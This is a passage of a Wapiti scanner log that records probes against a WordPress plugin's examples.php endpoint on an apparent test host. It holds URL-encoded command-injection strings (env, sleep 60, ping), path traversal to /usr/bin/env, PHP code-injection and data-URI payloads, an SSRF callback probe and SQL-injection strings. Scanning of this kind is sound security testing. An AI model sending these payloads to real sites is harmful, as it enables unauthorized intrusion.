	data: src=fuzz
2024-03-21 16:04:53.385 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/wp-content/plugins/seo-local-rank/admin/vendor/datatables/examples/resources/examples.php (0)
	data: src=%3Benv%3B
2024-03-21 16:04:53.390 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/wp-content/plugins/seo-local-rank/admin/vendor/datatables/examples/resources/examples.php (0)
	data: src=%7Cenv%7C
2024-03-21 16:04:53.395 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/wp-content/plugins/seo-local-rank/admin/vendor/datatables/examples/resources/examples.php (0)
	data: src=a%3Benv%3B
2024-03-21 16:04:53.400 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/wp-content/plugins/seo-local-rank/admin/vendor/datatables/examples/resources/examples.php (0)
	data: src=a%3Benv%3B
2024-03-21 16:04:53.404 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/wp-content/plugins/seo-local-rank/admin/vendor/datatables/examples/resources/examples.php (0)
	data: src=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fusr%2Fbin%2Fenv%7C
2024-03-21 16:04:53.409 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/wp-content/plugins/seo-local-rank/admin/vendor/datatables/examples/resources/examples.php (0)
	data: src=fuzz%3Benv%3B
2024-03-21 16:04:53.414 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/wp-content/plugins/seo-local-rank/admin/vendor/datatables/examples/resources/examples.php (0)
	data: src=fuzz%0Aenv%3B
2024-03-21 16:04:53.418 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/wp-content/plugins/seo-local-rank/admin/vendor/datatables/examples/resources/examples.php (0)
	data: src=%26set%26
2024-03-21 16:04:53.426 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/wp-content/plugins/seo-local-rank/admin/vendor/datatables/examples/resources/examples.php (0)
	data: src=set
2024-03-21 16:04:53.433 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/wp-content/plugins/seo-local-rank/admin/vendor/datatables/examples/resources/examples.php (0)
	data: src=env
2024-03-21 16:04:53.441 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/wp-content/plugins/seo-local-rank/admin/vendor/datatables/examples/resources/examples.php (0)
	data: src=%2Fe%00
2024-03-21 16:04:53.447 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/wp-content/plugins/seo-local-rank/admin/vendor/datatables/examples/resources/examples.php (0)
	data: src=a%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F
2024-03-21 16:04:53.455 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/wp-content/plugins/seo-local-rank/admin/vendor/datatables/examples/resources/examples.php (0)
	data: src=a%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23
2024-03-21 16:04:53.462 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/wp-content/plugins/seo-local-rank/admin/vendor/datatables/examples/resources/examples.php (0)
	data: src=%22%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F
2024-03-21 16:04:53.470 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/wp-content/plugins/seo-local-rank/admin/vendor/datatables/examples/resources/examples.php (0)
	data: src=%22%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23
2024-03-21 16:04:53.477 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/wp-content/plugins/seo-local-rank/admin/vendor/datatables/examples/resources/examples.php (0)
	data: src=%27%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F
2024-03-21 16:04:53.484 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/wp-content/plugins/seo-local-rank/admin/vendor/datatables/examples/resources/examples.php (0)
	data: src=%27%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23
2024-03-21 16:04:53.491 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/wp-content/plugins/seo-local-rank/admin/vendor/datatables/examples/resources/examples.php (0)
	data: src=%22.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F
2024-03-21 16:04:53.498 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/wp-content/plugins/seo-local-rank/admin/vendor/datatables/examples/resources/examples.php (0)
	data: src=%22.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%23
2024-03-21 16:04:53.506 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/wp-content/plugins/seo-local-rank/admin/vendor/datatables/examples/resources/examples.php (0)
	data: src=%27.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F
2024-03-21 16:04:53.514 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/wp-content/plugins/seo-local-rank/admin/vendor/datatables/examples/resources/examples.php (0)
	data: src=%27.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%23
2024-03-21 16:04:53.522 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/wp-content/plugins/seo-local-rank/admin/vendor/datatables/examples/resources/examples.php (0)
	data: src=%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F
2024-03-21 16:04:53.529 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/wp-content/plugins/seo-local-rank/admin/vendor/datatables/examples/resources/examples.php (0)
	data: src=%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23
2024-03-21 16:04:53.537 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/wp-content/plugins/seo-local-rank/admin/vendor/datatables/examples/resources/examples.php (0)
	data: src=data%3A%3Bbase64%2CPD9waHAgZWNobyAndzRwMXQxJywnX2V2YWwnOyA%2FPg%3D%3D
2024-03-21 16:04:53.545 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/wp-content/plugins/seo-local-rank/admin/vendor/datatables/examples/resources/examples.php (0)
	data: src=a%60%29%60
2024-03-21 16:04:53.552 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/wp-content/plugins/seo-local-rank/admin/vendor/datatables/examples/resources/examples.php (0)
	data: src=a%60sleep%2060%60
2024-03-21 16:04:53.561 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/wp-content/plugins/seo-local-rank/admin/vendor/datatables/examples/resources/examples.php (0)
	data: src=a%3Bsleep%2060%3B
2024-03-21 16:04:53.569 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/wp-content/plugins/seo-local-rank/admin/vendor/datatables/examples/resources/examples.php (0)
	data: src=a%7Csleep%2060%3B
2024-03-21 16:04:53.578 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/wp-content/plugins/seo-local-rank/admin/vendor/datatables/examples/resources/examples.php (0)
	data: src=%26ping%20-n%2025%20127.0.0.1%26
2024-03-21 16:04:53.608 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module ssrf
2024-03-21 16:04:53.623 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] POST http://web/wp-content/plugins/seo-local-rank/admin/vendor/datatables/examples/resources/examples.php (0)
	data: src=fuzz
2024-03-21 16:04:53.623 | VERBOSE  | wapitiCore.attack.mod_ssrf:attack:175 - [¨] POST http://web/wp-content/plugins/seo-local-rank/admin/vendor/datatables/examples/resources/examples.php (0)
	data: src=https%3A%2F%2Fwapiti3.ovh%2Fssrf%2Foncctp%2F1%2F737263%2F
2024-03-21 16:04:53.645 | INFO     | wapitiCore.attack.mod_ssrf:finish:185 - [*] Asking endpoint URL https://wapiti3.ovh/get_ssrf.php?session_id=oncctp for results, please wait...
2024-03-21 16:04:55.852 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module redirect
2024-03-21 16:04:55.859 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module xss
2024-03-21 16:04:55.876 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] POST http://web/wp-content/plugins/seo-local-rank/admin/vendor/datatables/examples/resources/examples.php (0)
	data: src=fuzz
2024-03-21 16:04:55.908 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module sql
2024-03-21 16:04:55.924 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] POST http://web/wp-content/plugins/seo-local-rank/admin/vendor/datatables/examples/resources/examples.php (0)
	data: src=fuzz
2024-03-21 16:04:55.924 | VERBOSE  | wapitiCore.attack.mod_sql:error_based_attack:368 - [¨] POST http://web/wp-content/plugins/seo-local-rank/admin/vendor/datatables/examples/resources/examples.php (0)
	data: src=fuzz%C2%BF%27%22%28
2024-03-21 16:04:55.939 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/wp-content/plugins/seo-local-rank/admin/vendor/datatables/examples/resources/examples.php (0)
	data: src=fuzz%20AND%2026%3D62%20AND%2023%3D23
2024-03-21 16:04:55.946 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/wp-content/plugins/seo-local-rank/admin/vendor/datatables/examples/resources/examples.php (0)
	data: src=fuzz%27%20AND%2091%3D172%20AND%20%2784%27%3D%2784
2024-03-21 16:04:55.953 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/wp-content/plugins/seo-local-rank/admin/vendor/datatables/examples/resources/examples.php (0)
	data: src=fuzz%22%20AND%2041%3D106%20AND%20%2286%22%3D%2286
2024-03-21 16:04:55.962 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/wp-content/plugins/seo-local-rank/admin/vendor/datatables/examples/resources/examples.php (0)
	data: src=fuzz%29%20AND%2091%3D141%20AND%20%2828%3D28
2024-03-21 16:04:55.973 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/wp-content/plugins/seo-local-rank/admin/vendor/datatables/examples/resources/examples.php (0)
	data: src=fuzz%27%29%20AND%2093%3D131%20AND%20%28%2779%27%3D%2779
2024-03-21 16:04:55.982 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/wp-content/plugins/seo-local-rank/admin/vendor/datatables/examples/resources/examples.php (0)
	data: src=fuzz%22%29%20AND%2067%3D135%20AND%20%28%2257%22%3D%2257
2024-03-21 16:04:56.008 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module csp
2024-03-21 16:04:56.041 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module permanentxss
2024-03-21 16:04:56.062 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] POST http://web/wp-content/plugins/seo-local-rank/admin/vendor/datatables/examples/resources/examples.php (0)
	data: src=fuzz
2024-03-21 16:04:56.090 | GREEN    | wapitiCore.controller.wapiti:write_report:601 - [*] Generating report...
2024-03-21 16:04:56.122 | SUCCESS  | wapitiCore.controller.wapiti:write_report:603 - A report has been generated in the file ./data/output//seo-local-rank.json/
2024-03-21 16:04:56.122 | SUCCESS  | wapitiCore.controller.wapiti:write_report:605 - Open ./data/output//seo-local-rank.json/web_03212024_1604.html with a browser to see this report.
